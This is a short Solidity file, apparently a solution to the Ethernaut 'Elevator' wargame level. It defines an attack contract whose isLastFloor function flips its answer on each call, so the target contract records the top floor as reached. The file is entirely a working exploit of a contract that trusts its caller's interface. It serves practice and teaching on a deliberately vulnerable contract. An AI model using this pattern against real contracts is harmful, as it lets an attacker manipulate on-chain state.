// SPDX-License-Identifier: MIT
pragma solidity ^0.6.10;

import './Elavator.sol';

contract ElavatorAttack {
    bool public toggle = true;
    Elevator public target;
    
    constructor(address _targetAddress) public {
        target = Elevator(_targetAddress);
    }
    function isLastFloor(uint) public returns (bool) {
        toggle = !toggle;
        return toggle;
    }
    
    function setTop(uint _floor) public {
       target.goTo(_floor);
        
    }
}
